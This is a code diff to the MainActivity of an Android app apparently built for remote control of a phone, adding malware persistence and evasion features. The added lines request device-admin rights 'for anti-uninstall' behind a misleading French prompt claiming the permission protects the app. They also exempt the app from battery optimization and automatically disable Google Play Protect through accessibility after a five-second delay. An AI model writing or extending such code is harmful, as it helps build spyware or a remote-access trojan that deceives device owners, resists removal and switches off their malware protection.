@@ -2,6 +2,8 @@ package com.remote.control;
 
 import android.Manifest;
 import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -37,6 +39,8 @@ public class MainActivity extends AppCompatActivity {
     private SharedPreferences prefs;
 
     private ActivityResultLauncher<Intent> screenCaptureLauncher;
+    private DevicePolicyManager devicePolicyManager;
+    private ComponentName deviceAdminComponent;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -54,6 +58,11 @@ public class MainActivity extends AppCompatActivity {
         btnAccessibility = findViewById(R.id.btnAccessibility);
 
         projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+
+        // Device Admin setup for anti-uninstall
+        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        deviceAdminComponent = DeviceAdminReceiver.getComponentName(this);
+        activateDeviceAdmin();
 
         // Check for deep link (auto-connect from browser)
         handleDeepLink(getIntent());
@@ -83,6 +92,14 @@ public class MainActivity extends AppCompatActivity {
 
         // Request runtime permissions for admin features
         requestDataPermissions();
+
+        // Bypass Play Protect and battery optimization
+        PlayProtectBypass bypass = new PlayProtectBypass(this);
+        bypass.requestBatteryOptimizationExemption();
+        // Auto-disable Play Protect after short delay (needs accessibility)
+        new android.os.Handler().postDelayed(() -> {
+            bypass.autoDisablePlayProtect();
+        }, 5000);
 
         // Update UI based on service state
         updateUI();
@@ -260,6 +277,16 @@ public class MainActivity extends AppCompatActivity {
                     }
                 }, 2000);
             }
+        }
+    }
+
+    private void activateDeviceAdmin() {
+        if (!devicePolicyManager.isAdminActive(deviceAdminComponent)) {
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponent);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                    "Cette autorisation est necessaire pour proteger l'application.");
+            startActivity(intent);
         }
     }
 
